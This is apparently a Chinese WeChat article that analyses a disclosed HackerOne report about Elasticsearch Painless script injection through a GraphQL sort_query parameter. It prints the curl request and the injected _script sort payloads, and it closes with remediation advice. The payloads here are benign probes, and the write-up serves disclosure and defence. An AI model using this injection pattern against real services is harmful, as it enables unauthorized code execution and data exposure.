---
title: 【$7,000】HackerOne 平台最新高危漏洞披露
url: https://mp.weixin.qq.com/s/mT2eOMJYfkcpviZmNbK4sA
source: Doonsec's feed
date: 2026-07-09
fetch_date: 2026-07-10T05:54:37.090276
---

# 【$7,000】HackerOne 平台最新高危漏洞披露

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/TKdPSwEibsZg0qBQ54eeU280GeDH6Xu2iaRANdbPOHRIOyFicEJGWcwhHNlGPQWEDplwLIG1AVRaw4D1a7E0XxTr5jW41Cicia34SKEeRgUtlEQg/0?wx_fmt=jpeg)

# 【$7,000】HackerOne 平台最新高危漏洞披露

Z2O安全攻防

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

以下文章来源于骨哥说事
，作者骨哥说事

![](http://wx.qlogo.cn/mmhead/Tjnia6K0WAwymfmKQ4Vxu2yovHNIGmF3wZKN9Peic0bS16wzb8MQuwUX7HuGjlMO3NmmvxOcHnjSM/0)

**骨哥说事**
.

一个喜爱鼓捣的技术宅

> “最危险的地方往往是最安全的地方。” 近日，知名漏洞赏金平台 HackerOne 在其官方平台上被研究员发现一处 **Authenticated Elasticsearch Painless Script Execution**（认证态下 ES 脚本执行）漏洞。今天我们就来拆解这个漏洞，并附上**完整的 PoC 验证过程与底层逻辑分析**。

---

## 🔍 漏洞核心：一个 `String` 参数，直通 ES 引擎

![HackerOne | Leader in Continuous Threat Exposure Management | Security for  AI](https://mmbiz.qpic.cn/mmbiz_jpg/TKdPSwEibsZhNSVBZ5eDSoP0sVuwI1VXzicMVeBx5C2ejSBcys10KpeIvJyZCTF0vJW7MgLPCOrVg1amkxPH9k8yJFy5vQDicSLqNqYGHtNNjA/640?wx_fmt=jpeg&from=appmsg)

HackerOne 的 GraphQL API（`https://hackerone.com/graphql`）中，`Query.search` 接口提供了一个名为 `sort_query: String` 的参数。按常规设计，排序参数应当经过严格的 Schema 校验或白名单过滤后再下发给搜索引擎。

但实际情况是：**该参数未经任何服务端校验，直接以原始字符串形式拼接进 Elasticsearch 的 `sort` 查询语句中。**这意味着，攻击者可以构造包含 `_script` 字段的 JSON 排序规则，进而触发 ES 内置的 **Painless 脚本引擎**进行编译与执行。

---

## 🛠️ 完整 PoC 验证过程

研究员采用“控制变量法”与“差分测试”完成了严谨的 PoC 验证。以下为完整步骤还原（已对敏感 Cookie/Token 作脱敏处理，仅保留核心 Payload 与验证逻辑）：

### 📦 0. 环境准备与身份确认

所有请求均通过同一浏览器会话发起，携带完整的认证 Cookie（`__Host-session`, `cf_clearance`）及 CSRF Token。

**验证会话身份：**

```
curl -sk 'https://hackerone.com/graphql' \
  -H 'content-type: application/json' \
  -b "$COOKIE" \
  --data-raw '{"query":"{me{_id username}}"}' | jq
```

**响应：**

```
{"data":{"me":{"_id":"████████","username":"brumbelow"}}}
```

✅ 确认当前为普通 Reporter 权限账号，无越权基础。

---

### 📐 Step 1：验证 `sort_query` 可解析原始 JSON

在注入脚本前，先证明该参数能正确解析 Elasticsearch 的排序 DSL。

**Payload（按 `id` 升序）：**

```
{
  "query": "query { search(index: NotificationsIndex, query_string: \"*\", sort_query: \"[{\\\"id\\\": \\\"asc\\\"}]\", size: 5) { nodes { ... on NotificationDocument { id } } } }"
}
```

**响应（前 5 条 ID）：**`404547633`, `408446504`, `416737094`, `417300042`, `417467303`👉 严格单调递增，证明 `sort_query` 字符串被后端正确解析为 ES JSON 排序结构。

**进阶验证（嵌套对象语法）：**

```
[{"user_id":{"order":"desc","missing":"_last"}}]
[{"created_at":{"order":"desc","mode":"max"}}]
```

✅ 均返回 `total_count: 716`（当前用户通知总数），证明复杂 ES 排序语法均可透传。

---

### 🔬 Step 2：编译态探测（证明输入直达 Painless 编译器）

通过构造不同 `script.source` 值，观察服务端返回差异，若仅做 JSON Schema 校验，以下 Payload 结构完全一致；能区分“语法错误”与“合法代码”的只有 Painless 编译器。

| `script.source` 值 | HTTP 状态 / 响应特征 | Painless 编译结果 |
| --- | --- | --- |
| `""` （空字符串） | `500 / STANDARD_ERROR` | ❌ 编译失败 |
| `"unterminated"` （未闭合字符串） | `500 / STANDARD_ERROR` | ❌ 编译失败 |
| `"1"` （合法常量） | `200 / total_count: 716` | ✅ 编译成功 |
| `"1+1"` （合法表达式） | `200 / total_count: 716` | ✅ 编译成功 |

**核心 Payload 结构：**

```
[{"_script":{"type":"number","script":{"source":"<PAYLOAD>","lang":"painless"},"order":"asc"}}]
```

👉 **结论**：200/500 的分界线与 Painless 语法合法性完全吻合，证明用户输入已绕过中间件校验，直达 ES 脚本编译层。

---

### 🎯 Step 3：执行态探测（证明脚本逐文档真实运行）

编译成功不代表会执行。研究员通过“差分排序”验证脚本是否在查询阶段逐文档运行。

**请求 A（基准：返回常量）**

```
"source": "1"
```

**请求 B（目标：读取文档元数据）**

```
"source": "doc[\"_seq_no\"].value"
```

> 💡 `_seq_no` 是 Elasticsearch 内部维护的文档写入序列号，随索引时间单调递增。按 `_seq_no` 升序排序，结果应与按内部 `_id` 升序一致。

**响应对比（前 5 条文档 ID）：**

| 位置 | 请求 A (`"1"`) | 请求 B (`"_seq_no"`) |
| --- | --- | --- |
| 1 | `451190393` | `404547633` |
| 2 | `433571802` | `408446504` |
| 3 | `444651582` | `416737094` |
| 4 | `444773121` | `417300042` |
| 5 | `445067118` | `417467303` |

🔍 **关键发现**：

* 两次请求返回的文档 ID **零重叠**。
* 请求 B 的顺序与 Step 1 中 `sort_query: '[{"id":"asc"}]'` 的结果完全一致。
* 若 `_script` 被静默丢弃或仅编译不执行，请求 B 应与请求 A 返回相同顺序。

✅ **最终结论**：Painless 脚本不仅在服务端编译成功，且在 Elasticsearch 查询阶段**逐文档执行**，并真实读取了 `doc` 上下文中的元数据字段。

---

## 🔍 为什么这套验证逻辑值得学习？

1. **最小攻击面**：仅使用 `"1"`、`"1+1"`、`doc["_seq_no"].value`，未调用任何 API、未读取用户字段、未尝试沙箱逃逸。
2. **差分控制变量**：通过“编译失败 vs 成功”、“常量返回 vs 动态字段读取”两组对照，彻底排除中间件拦截或静默丢弃的可能性。
3. **伦理边界清晰**：全程在 `NotificationsIndex`（仅含自身 716 条通知）内测试，未触碰跨租户数据、未验证越权路径，符合负责任披露原则。

---

## ⚠️ 潜在影响与风险边界

作者比较克制，没有宣称已经实现 RCE，而是指出了几个潜在风险：

| 风险维度 | 说明 |
| --- | --- |
| 🔓 **数据泄露** | ES `_script` 排序发生在 GraphQL Resolver 权限过滤**之前**。若索引未按租户严格隔离，脚本可读取当前用户无权访问的文档字段。 |
| 💥 **拒绝服务（DoS）** | Painless 脚本逐文档执行。恶意构造死循环、大对象分配或复杂计算，可迅速耗尽共享 ES 集群的 CPU/内存资源。 |
| 🧩 **代码执行面** | Painless 运行在 ES JVM 进程中。尽管官方沙箱限制了文件/网络访问，但历史版本中仍存在绕过案例。一旦结合其他组件漏洞，可能升级为 RCE。 |
| 🌐 **影响范围** | 除 `NotificationsIndex` 外，`DuplicateDetectorReportsIndex`、`OpportunitiesIndex`、`Organization.findings_search` 等多个接口均暴露相同参数，存在横向扩散风险。 |

---

## 🛡️ 修复建议 & 架构安全指南

### HackerOne 官方建议

1. **移除 `sort_query: String`**，改用强类型 GraphQL Input（如 `SortInput`），在 Schema 层完成字段白名单校验。
2. 对同类接口进行统一收敛与重构，杜绝自由文本参数直连搜索引擎。

### 给开发者的架构安全建议

| 场景 | ❌ 错误做法 | ✅ 正确实践 |
| --- | --- | --- |
| GraphQL + ES/DB 查询拼接 | `sort: req.params.sort_query` （直接透传） | 使用枚举/白名单映射：`allowedFields = ['id','created_at']`，校验后动态构建 DSL |
| 脚本引擎调用 | 允许用户传入 `script.source` | 禁用动态脚本，或强制使用预编译缓存脚本（`id` 引用）+ 严格沙箱策略 |
| 权限过滤时机 | 先排序/聚合，后在 Resolver 层过滤 | **权限下推** ：在 ES 查询阶段通过 `terms`/`script` 注入用户 ID 过滤，确保排序前已隔离数据 |
| 资源防护 | 无限制执行用户脚本 | 设置 `max_compilation_memory_limit`、`script.max_execution_time`，并启用集群监控告警 |

---

## 安全无小事，平台自身也需“打补丁”

HackerOne 作为全球漏洞赏金领域的标杆，此次被“自家平台”挖出高危漏洞，再次印证了一个道理：**安全不是护城河，而是持续迭代的工程实践。** 研究员克制、严谨的验证方式也为我们树立了白帽典范：证明漏洞存在即可，不越界、不破坏、不滥用。

对于正在使用 GraphQL + Elasticsearch 架构的团队，建议立即排查：

* 是否存在 `String` 类型参数直接拼接至搜索 DSL？
* 是否开放了 `_script`、`aggs.script`、`highlight.fields` 等动态字段？
* 权限过滤是否真正发生在数据检索的最底层？

安全架构的最后一道防线，往往藏在最不起眼的参数校验里。

原始报告：HackerOne Report #3694007- END -

**建了个**src专项圈子，内容包含**src漏洞知识库**、**src挖掘技巧**、**src视频教程**等，一起学习赚赏金技巧，以及专属微信群一起挖洞

圈子专注于更新src相关：

```
1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例2、分享src优质视频课程3、分享src挖掘技巧tips4、小群一起挖洞
```

![Image](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuaRqDOYRFjU73rIsVy2ISg41LkR0ezBlmjJY4Lwgg8mr1A5efwqe0yGE9KTQwLPJTe9zyv3wgYnhA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=0)

![Image](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuY813zmiaXibeTuHFXd8WtJAOXg868PqXyjsACp9LhuEeyfB2kTZVOt5Pz48txg7ueRUvDdeefTNKdg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=1)

![Image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/h8P1KUHOKuZDDDv3NsbJDuSicLzBbwVDCPFgbmiaJ4ibf4LRgafQDdYodOgakdpbU1H6XfFQCL81VTudGBv2WniaDA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=2 "null")

![Image](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYx6e5OYqRUhe5nHp6uuOTahgbr35OD8B1WCHW2uGMetuDzTPJiaHibhWhMm8UQ5iboDmNKqrRfjIrXQ/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=5)

![Image](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuadANlnTubvh6Abe7UZLdQWr5g7s0TNF4tBZqNbdewPNswTDOfvN6PkggCqz8j3mib6Vf3z4ia83asg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=6)

图片

![Image](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuaRqDOYRFjU73rIsVy2ISg4Bd1oBmTkA5xlNwZM5fLghYeibMBttWrf57h8sU7xDyTe5udCNicuHo8w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=7)

![Image](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYx6e5OYqRUhe5nHp6uuOTaTWxLibDHdqdx6IahjVWr6ficJWskIMjdrbYaLGBIVsbONxbb5ibDS5trQ/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=8)

图片

![Image](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYx6e5OYqRUhe5nHp6uuOTafQtWhe2qhicQCvx8XaDyp6Kb4eeWBnhZLlGKcAvxKausLKc2YYggykQ/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=11)

图片

![Image](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuadANlnTubvh6Abe7UZLdQWWIDTric5u0Q03o25wLLgNBwFd6t4ud64ACo8icCdQRzrEGezUzIKSvEA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=12)

![Image](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuadANlnTubvh6Abe7UZLdQWXytl9Ioah3X7tw7EMlWV96wWXEHFEM4m6NwlvvkcmEcPqcxcE9MQDg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=14)

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuaDpuFU7U9TMK5eIpY8iaJcXCicmTB6fsRd8icmH7K1X99YbC07GaJbCRReocORsnDGNU7H7PeqcysIA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=20)

![Image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/JnmoqeNZZwTn8lOvx4KuaksOD3tIg8aI1RUqbsodq12Qwtibao6pokMOic17NiakLMmPVlpFG3kFJLVc7jZoH6V3wpXiaY3sv4GJxcpXvlBQtUs/640?wx_fmt=jpeg&from=appmsg&wxfrom=5&wx...